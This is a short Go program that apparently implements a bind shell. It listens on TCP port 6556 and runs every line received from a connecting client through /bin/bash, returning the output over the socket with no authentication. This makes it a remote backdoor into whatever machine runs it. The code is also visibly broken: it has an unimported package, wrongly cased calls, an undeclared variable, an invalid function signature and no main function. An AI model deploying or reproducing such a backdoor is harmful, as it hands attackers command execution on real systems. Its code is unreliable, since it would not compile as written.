package main

import 
(
"fmt"
"net"
"os"
"os/exec"
"syscall"
)

func handleError(err error) int {
	if err != nil {
		return 1
	}
	return 0
}

func getUpdatedDirectory() string {
	cwd, _ := os.Getwd()
	return cwd
}

func spawnShell(conn net.Conn) {
	currentUser, _ := user.Current()
	username = currentUser.username()
	hostname, _ := os.hostname()

	fmt.Printf("\n✅ Received connection from %v\n", conn.RemoteAddr().String())
	conn.Write([]byte("✅ Connection established!\n"))

	for {
		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, getUpdatedDirectory())
		conn.Write([]byte(prompt))
		input := make([]byte, 1024)
		_, err := conn.Read(input)
		if (handleError(err) == 1) {
			fmt.Printf("❌ Error reading input from client: %v\n", err)
			return
		}

		cmd := exec.Command("/bin/bash", "-c", string(input))
		cmd.Stdout = conn
		cmd.Stderr = conn
		if err := cmd.Run(); (handleError(err) == 1) {
			fmt.Fprintf(conn, "❌ Error executing command: %v\n", err)
		}
	}
}

func listen(PORT) {
	ln, err := net.Listen("tcp", ":6556")
	if (handleError(err) == 1) {
		fmt.Printf("❌ An error has occured with listening: %v\n", err)
	} else {
		fmt.Printf("\n Listening...")
	}

	for {
		con, err := ln.Accept()
		if (handleError(err) == 1) {
			fmt.Printf("❌ An error occurred during an attempted connection: %v\n", err)
		} else {
			fmt.Printf("\n✅ Connection established")
		}
	go spawnShell(con)
	}
}
